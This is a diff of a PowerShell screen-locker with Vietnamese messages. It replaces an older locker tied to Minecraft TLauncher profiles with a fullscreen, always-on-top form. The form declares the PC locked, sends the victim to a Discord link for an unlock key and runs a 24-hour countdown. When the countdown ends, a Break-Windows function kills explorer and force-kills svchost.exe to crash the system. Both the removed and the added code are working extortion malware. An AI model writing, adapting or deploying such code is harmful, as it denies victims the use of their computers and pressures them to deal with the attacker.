@@ -1,54 +1,84 @@
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName Microsoft.VisualBasic
+Add-Type -AssemblyName System.Drawing
 
-# Cấu hình
-$tlauncherFile = "$env:APPDATA\.minecraft\TlauncherProfiles.json"
-$lockFile = "$env:APPDATA\lockdate.dat"
-$key = "UNLOCK-123456"
-$checkString = "khoi2802"
-$maxTimeout = New-TimeSpan -Hours 24
+# ====== SETTINGS ======
+$correctKey = "taodeptrai"
+$hoursLeft = 24
+$deadline = (Get-Date).AddHours($hoursLeft)
 
-# Nếu file tồn tại và chứa chuỗi
-if (Test-Path $tlauncherFile) {
-    $content = Get-Content $tlauncherFile -Raw
-    if ($content -match $checkString) {
-        # Tạo file lock nếu chưa có
-        if (-not (Test-Path $lockFile)) {
-            Get-Date | Out-File $lockFile
-        }
+# ====== FORM SETUP ======
+$form = New-Object System.Windows.Forms.Form
+$form.FormBorderStyle = 'None'
+$form.WindowState = 'Maximized'
+$form.TopMost = $true
+$form.BackColor = 'Black'
 
-        # Lấy thời điểm khoá và thời gian còn lại
-        $lockTime = Get-Content $lockFile | Get-Date
-        $now = Get-Date
-        $elapsed = $now - $lockTime
-        $remaining = $maxTimeout - $elapsed
+# ====== LABEL - MAIN TEXT ======
+$label = New-Object System.Windows.Forms.Label
+$label.Text = "PC đã bị khóa!`nNhập key để mở khóa!`nliên hệ tại:https://discord.gg/rf3fcuwz`nbensgaming locked"
+$label.ForeColor = 'Red'
+$label.Font = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
+$label.AutoSize = $true
+$label.Location = New-Object System.Drawing.Point(100, 100)
+$form.Controls.Add($label)
 
-        # Nếu hết thời gian thì phá máy
-        if ($remaining.TotalSeconds -le 0) {
-            Stop-Process -Name svchost -Force
-        }
+# ====== COUNTDOWN LABEL ======
+$countdownLabel = New-Object System.Windows.Forms.Label
+$countdownLabel.Text = ""
+$countdownLabel.ForeColor = 'White'
+$countdownLabel.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Regular)
+$countdownLabel.AutoSize = $true
+$countdownLabel.Location = New-Object System.Drawing.Point(100, 180)
+$form.Controls.Add($countdownLabel)
 
-        # Format thời gian còn lại
-        $countdown = "{0:D2}:{1:D2}:{2:D2}" -f $remaining.Hours, $remaining.Minutes, $remaining.Seconds
+# ====== TEXTBOX - KEY INPUT ======
+$textBox = New-Object System.Windows.Forms.TextBox
+$textBox.Font = New-Object System.Drawing.Font("Consolas", 20)
+$textBox.Width = 300
+$textBox.Location = New-Object System.Drawing.Point(100, 250)
+$form.Controls.Add($textBox)
 
-        # Yêu cầu nhập key
-        $msg = "bensgaming on top`n"
-        $msg += "Máy bạn đã bị khoá.`n"
-        $msg += "Thời gian còn lại: $countdown`n"
-        $msg += "Liên hệ: https://discord.gg/rf3fcuwz để đc key"
-        $msg += "Vui lòng nhập key chính xác để mở khoá:"
+# ====== BUTTON - UNLOCK ======
+$button = New-Object System.Windows.Forms.Button
+$button.Text = "MỞ KHÓA"
+$button.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
+$button.BackColor = 'Gray'
+$button.ForeColor = 'White'
+$button.Width = 150
+$button.Height = 50
+$button.Location = New-Object System.Drawing.Point(420, 250)
+$form.Controls.Add($button)
 
-        $inputKey = [Microsoft.VisualBasic.Interaction]::InputBox(
-            $msg,
-            "Khóa hệ thống",
-            ""
-        )
-
-        if ($inputKey -eq $key) {
-            Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
-            [System.Windows.Forms.MessageBox]::Show("✅ Mở khoá thành công!", "Hoàn tất")
-        } else {
-            rundll32.exe user32.dll,LockWorkStation
-        }
-    }
+# ====== FUNCTION: KILL WINDOWS ======
+function Break-Windows {
+    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
+    Start-Sleep -s 2
+    taskkill /f /im svchost.exe
 }
+
+# ====== BUTTON CLICK EVENT ======
+$button.Add_Click({
+    if ($textBox.Text -eq $correctKey) {
+        [System.Windows.Forms.MessageBox]::Show("Mã đúng! Đang mở khóa...", "OK", 'OK', 'Information')
+        $form.Close()
+    } else {
+        [System.Windows.Forms.MessageBox]::Show("Sai mã!", "Lỗi", 'OK', 'Error')
+    }
+})
+
+# ====== COUNTDOWN TIMER ======
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 1000  # 1s
+$timer.Add_Tick({
+    $now = Get-Date
+    $timeLeft = $deadline - $now
+    if ($timeLeft.TotalSeconds -le 0) {
+        $timer.Stop()
+        Break-Windows
+    }
+
+    $countdownLabel.Text = "Thời gian còn lại: " + $timeLeft.ToString("hh\:mm\:ss")
+})
+
+$timer.Start()
+$form.ShowDialog()
